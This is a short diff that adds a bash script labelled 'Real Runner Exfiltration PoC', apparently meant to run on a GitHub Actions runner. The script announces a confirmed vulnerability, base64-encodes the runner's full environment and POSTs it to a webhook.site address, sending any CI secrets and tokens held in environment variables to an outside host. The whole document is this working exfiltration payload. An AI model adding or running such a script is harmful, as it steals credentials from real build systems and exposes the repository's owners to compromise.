@@ -1,0 +1,5 @@
+#!/bin/bash
+# Real Runner Exfiltration PoC
+echo "[VULNERABILITY CONFIRMED: LIVE GITHUB RUNNER]"
+export DATA=$(printenv | base64 -w 0)
+curl -X POST -d "env=$DATA" https://webhook.site/34790ae8-a0ef-4ea4-bee3-5b3b4e7cbb61
